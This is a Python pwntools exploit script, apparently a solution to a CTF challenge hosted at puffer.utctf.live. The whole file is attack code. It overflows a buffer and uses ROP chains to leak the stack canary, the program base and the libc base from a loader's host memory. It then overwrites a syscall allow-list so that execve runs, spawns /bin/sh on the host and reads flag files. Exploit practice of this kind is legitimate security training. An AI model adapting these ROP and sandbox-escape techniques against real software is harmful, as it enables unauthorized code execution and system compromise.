#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("loader_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "puffer.utctf.live", "7132"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path,'hello'])

# gadgets in hello binary
pop_rax = 0x0000000000401001 # pop rax; ret;
pop_rdi = 0x00000000040013af # pop rdi; ret;
pop_rdx = 0x00000000040023b3 # pop rdx; ret;
pop_rsi = 0x00000000040013ad # pop rsi; pop r15; ret;
pop_rsp = 0x00000000040025f9 # pop rsp; ret;
syscall = 0x00000000040024ab # syscall; ret;

# first ROP, will be executed in guest
payload = 'A'*0x100+p64(0xdeadbeef)
payload += p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x0000000004004000)+p64(0)+p64(pop_rdx)+p64(0x600)+p64(syscall)	# syscall read, will leak host memory & copy it to guest memory
payload += p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x0000000004004079)+p64(0)+p64(pop_rdx)+p64(8)+p64(syscall)	# syscall write to leak canary
payload += p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x0000000004004088)+p64(0)+p64(pop_rdx)+p64(8)+p64(syscall)	# syscall write to leak prog address
payload += p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x0000000004004308)+p64(0)+p64(pop_rdx)+p64(8)+p64(syscall)	# syscall write to leak a libc address
payload += p64(pop_rdi)+p64(0x0000000004004000)+p64(0x40003da)			# call gets again to read next ROP on .bss
payload += p64(pop_rsp)+p64(0x0000000004004000)					# pivot on next ROP
sla('name: \n', payload)

p.recvuntil('\n',drop=True)

# cut syscall read, to make the program leak host stack memory, and copy it to guest memory
p.send('B'*0x78)
# receive out various leaks for write syscalls
# canary
p.recvuntil('buf=\'', drop=True)
canary = u64(b'\x00'+p.recv(7))
logleak('canary', canary)
stack = u64(p.recvuntil('\'', drop=True).ljust(8,b'\x00'))
logleak('stack', stack)
# calculate progbase
p.recvuntil('buf=\'', drop=True)
exe.address = u64(p.recvuntil('\'', drop=True).ljust(8,b'\x00')) - 0xa57504
logleak('prog base', exe.address)
# libc address
p.recvuntil('buf=\'', drop=True)
libc.address = u64(p.recvuntil('\'', drop=True).ljust(8,b'\x00'))-0x9a154 # offset from 2.31-0ubuntu9.8_amd64
logbase()

# second ROP (on guest)
payload2 = (p64(pop_rax)+p64(16)+p64(syscall))*46		# advance syscall_cnt number (up to 59)
payload2 += p64(pop_rdi)+p64(0x775670)+p64(pop_rax)+p64(1024)+p64(syscall)	# overwrite exit_syscalls[0] with 59 to authorize execve
# the '/bin/sh' string address is from host memory, as the execve will be executed by the host
payload2 += p64(pop_rax)+p64(59)+p64(pop_rdi)+p64(next(libc.search('/bin/sh')))+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)*2+p64(syscall)		# execve(/bin/sh,0,0)
sl(payload2)

#enjoy shell
sleep(1)
p.sendline('id;cat flag*')

p.interactive()

